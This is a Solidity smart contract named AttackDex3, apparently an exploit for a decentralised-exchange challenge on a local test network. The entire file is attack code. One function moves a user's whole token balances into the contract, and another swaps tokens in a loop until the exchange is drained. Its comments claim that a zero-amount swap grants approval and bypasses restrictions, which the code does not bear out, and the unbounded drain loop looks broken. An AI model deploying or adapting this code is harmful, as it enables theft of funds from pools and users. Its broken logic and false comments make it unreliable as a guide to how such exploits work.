pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDex {
    function swap(address from, address to, uint256 amount) external;
}

contract AttackDex3 {
    address immutable token1 = 0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968;
    address immutable token2 = 0xeEBe00Ac0756308ac4AaBfD76c05c4F3088B8883;
    address immutable user = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address immutable dex = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;

    constructor() {
        // Approve attacker contract to spend Dex tokens via Dex's approve function
        // This allows us to bypass the SwappableToken's approval restrictions
        IDex(dex).swap(token1, token2, 0); // Call swap to get approval tokens
    }

    function takeUserTokens() external {
        // Check how many tokens the user has available and take them
        uint256 userToken1 = IERC20(token1).balanceOf(user);
        if (userToken1 > 0) {
            IERC20(token1).transferFrom(user, address(this), userToken1);
        }
        
        uint256 userToken2 = IERC20(token2).balanceOf(user);
        if (userToken2 > 0) {
            IERC20(token2).transferFrom(user, address(this), userToken2);
        }
    }

    function drain() public {
        // Continuously swap all tokens back and forth until the Dex is drained
        while(IERC20(token1).balanceOf(dex) != 0 || IERC20(token2).balanceOf(dex) != 0) {
            uint256 amount1 = IERC20(token1).balanceOf(address(this));
            if (amount1 > 0) {
                IDex(dex).swap(token1, token2, amount1);
            }
            
            uint256 amount2 = IERC20(token2).balanceOf(address(this));
            if (amount2 > 0) {
                IDex(dex).swap(token2, token1, amount2);
            }
        }
    }
}